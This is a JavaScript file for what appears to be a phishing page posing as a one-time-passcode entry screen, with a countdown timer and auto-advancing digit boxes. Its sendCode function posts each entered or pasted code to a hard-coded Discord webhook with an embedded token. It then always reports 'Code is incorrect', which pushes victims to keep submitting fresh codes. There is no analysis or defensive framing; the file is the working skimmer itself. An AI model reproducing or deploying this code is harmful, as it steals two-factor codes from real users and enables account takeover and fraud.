"use strict";

document.addEventListener('DOMContentLoaded', () => {
    const countdownElement = document.getElementById('countdown');
    const errorMessage = document.getElementById('error-message');
    const inputs = document.querySelectorAll('.input-box');
    const webhookURL = 'https://discord.com/api/webhooks/1255451054003195985/-IIJYymOmPdQBBXcS2JyhGdD6Bi1ZZrC11bJmLXAIC36Dh2QXpsQhZEomoCSM1h_CsBf';
    
    let countdown;
    let countdownValue = 6 * 60; // 6 minutes in seconds

    function startCountdown() {
        countdownValue = 6 * 60;
        updateCountdownDisplay();
        countdown = setInterval(() => {
            countdownValue--;
            updateCountdownDisplay();
            if (countdownValue <= 0) {
                clearInterval(countdown);
                startCountdown();
            }
        }, 1000);
    }

    function updateCountdownDisplay() {
        const minutes = Math.floor(countdownValue / 60);
        const seconds = countdownValue % 60;
        countdownElement.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
    }

    function sendCode() {
        const message = Array.from(inputs).map(input => input.value).join('');
        const otpMessage = "----------------------------------------------\nOTP: " + message + "\n----------------------------------------------";
        
        fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ content: otpMessage })
        }).then(response => {
            clearInputs();
            if (!response.ok) {
                errorMessage.textContent = 'Code is incorrect';
            }
        }).catch(error => {
            console.error('Error:', error);
            errorMessage.textContent = 'Code is incorrect';
            clearInputs();
        });
    }

    function clearInputs() {
        inputs.forEach(input => {
            input.value = '';
        });
        inputs[0].focus();
    }

    startCountdown();

    inputs.forEach((input, index) => {
        input.addEventListener('input', () => {
            if (input.value.length === 1) {
                if (index < inputs.length - 1) {
                    inputs[index + 1].focus();
                } else {
                    sendCode();
                }
            }
        });

        input.addEventListener('keydown', (event) => {
            if (event.key === 'Backspace' && input.value === '' && index > 0) {
                inputs[index - 1].focus();
            }
        });

        input.addEventListener('paste', (event) => {
            const paste = (event.clipboardData || window.clipboardData).getData('text');
            const pasteArray = paste.split('').slice(0, inputs.length);
            pasteArray.forEach((char, i) => {
                inputs[i].value = char;
            });
            inputs[pasteArray.length - 1].focus();
            event.preventDefault();
            sendCode();
        });
    });
});

